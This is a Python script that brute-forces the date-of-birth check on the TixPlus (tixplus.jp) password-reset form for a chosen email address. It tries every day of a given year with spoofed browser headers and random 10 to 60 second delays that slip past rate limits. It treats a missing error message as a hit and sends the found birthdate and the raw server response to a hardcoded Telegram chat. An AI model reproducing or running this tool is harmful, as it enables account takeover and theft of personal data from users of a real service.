import requests
import asyncio
import sys
from datetime import datetime, timedelta
from typing import Optional, Tuple
import os
from dotenv import load_dotenv

load_dotenv()

class PasswordResetChecker:
    def __init__(self, telegram_bot_token: str = None, telegram_chat_id: str = None):
        self.base_url = "https://tixplus.jp/login/pass_forgot_send_o.php"
        self.telegram_bot_token = telegram_bot_token or os.getenv("TELEGRAM_BOT_TOKEN")
        self.telegram_chat_id = telegram_chat_id or os.getenv("TELEGRAM_CHAT_ID")
        
        self.headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en,ja;q=0.9,zh-CN;q=0.8,zh;q=0.7",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1"
        }
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
    def send_telegram_message(self, message: str) -> bool:
        """Send a message via Telegram bot"""
        if not self.telegram_bot_token or not self.telegram_chat_id:
            print("Telegram credentials not configured")
            return False
            
        try:
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            payload = {
                "message_thread_id": "6173",
                "chat_id": "-1002646331785", 
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Failed to send Telegram message: {e}")
            return False
    
    def check_date(self, email: str, year: int, month: int, day: int) -> Tuple[bool, Optional[str]]:
        """Check a specific date combination"""
        body = f"idlink=&id={email}&birth_y={year}&birth_m={month}&birth_d={day}"
        
        try:
            response = self.session.post(
                self.base_url,
                data=body,
                timeout=30,
                allow_redirects=True
            )
            
            # Check response content
            if "入力された情報は登録されていません。" in response.text:
                return False, None
            else:
                # Success - different message found
                return True, response.text
                
        except requests.RequestException as e:
            print(f"Error checking {year}-{month}-{day}: {e}")
            return False, None
    
    async def check_all_dates(self, email: str, year: int, start_date: Tuple[int, int] = (1, 1), 
                              end_date: Tuple[int, int] = (12, 31)):
        """Check all dates in the given year"""
        start_month, start_day = start_date
        end_month, end_day = end_date
        
        # Create start and end dates
        start = datetime(year, start_month, start_day)
        end = datetime(year, end_month, end_day)
        
        current = start
        total_days = (end - start).days + 1
        checked = 0
        
        print(f"Starting check for year {year} from {start.strftime('%Y-%m-%d')} to {end.strftime('%Y-%m-%d')}")
        print(f"Total days to check: {total_days}")
        
        # Send start notification
        start_msg = f"🔍 <b>Password Reset Check Started</b>\n📧 Email: {email}\n📅 Year: {year}\n📆 Range: {start.strftime('%Y-%m-%d')} to {end.strftime('%Y-%m-%d')}\n📊 Total: {total_days} dates"
        self.send_telegram_message(start_msg)
        
        while current <= end:
            month = current.month
            day = current.day
            checked += 1
            
            print(f"[{checked}/{total_days}] Checking {year}-{month:02d}-{day:02d}...")
            if not checked % 25:
                self.send_telegram_message(f"[{checked}/{total_days}] Checking {year}-{month:02d}-{day:02d}...")
            
            is_found, response_text = self.check_date(email, year, month, day)
            
            if is_found:
                success_msg = (
                    f"✅ <b>SUCCESSFUL RESET FOUND!</b>\n\n"
                    f"📧 Email: {email}\n"
                    f"📅 Date: {year}-{month:02d}-{day:02d}\n"
                    f"🔗 URL: {self.base_url}\n\n"
                    f"Response does NOT contain the error message."
                )
                
                print(f"✓ Found working date: {year}-{month:02d}-{day:02d}")
                print(f"Response snippet: {response_text[:500]}...")
                
                # Send success message
                self.send_telegram_message(success_msg)
                
                # Also send the response if it's not too long
                if len(response_text) < 4000:
                    self.send_telegram_message(f"<b>Response:</b>\n<pre>{response_text[:3000]}</pre>")
                
                return True, (year, month, day)
            
            import time
            import random

            # Generate a random float between 10.0 and 60.0
            sleep_time = random.uniform(10, 60)

            print(f"Sleeping for {sleep_time:.2f} seconds...")
            time.sleep(sleep_time)
            print("Done!")

            # Move to next day
            current += timedelta(days=1)
            
            # Send progress update every 100 days
            # if checked % 100 == 0:
            #     progress_msg = f"📊 <b>Progress Update</b>\n✅ Checked: {checked}/{total_days} dates\n📅 Last checked: {current.strftime('%Y-%m-%d')}\n⏳ Remaining: {total_days - checked}"
            #     self.send_telegram_message(progress_msg)
        
        # Send completion message
        complete_msg = f"🏁 <b>Check Complete</b>\n📧 Email: {email}\n📅 Year: {year}\n❌ No working date found\n📊 Total checked: {total_days}"
        self.send_telegram_message(complete_msg)
        
        return False, None

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Check password reset dates for TixPlus')
    parser.add_argument('--year', type=int, required=True, help='Year to check')
    parser.add_argument('--email', type=str, default='Plusmember-Test@20051031.xyz', help='Email to test')
    parser.add_argument('--start-month', type=int, default=1, help='Start month (1-12)')
    parser.add_argument('--start-day', type=int, default=1, help='Start day (1-31)')
    parser.add_argument('--end-month', type=int, default=12, help='End month (1-12)')
    parser.add_argument('--end-day', type=int, default=31, help='End day (1-31)')
    
    args = parser.parse_args()
    
    # Validate date range
    try:
        datetime(args.year, args.start_month, args.start_day)
        datetime(args.year, args.end_month, args.end_day)
    except ValueError as e:
        print(f"Invalid date range: {e}")
        sys.exit(1)
    
    # Initialize checker
    checker = PasswordResetChecker()
    
    # Run the check
    import asyncio
    found, date = asyncio.run(checker.check_all_dates(
        email=args.email,
        year=args.year,
        start_date=(args.start_month, args.start_day),
        end_date=(args.end_month, args.end_day)
    ))
    
    if found:
        print(f"\n✅ Success! Working date found: {date[0]}-{date[1]:02d}-{date[2]:02d}")

    else:
        print(f"\n❌ No working date found for year {args.year}")


if __name__ == "__main__":
    main()
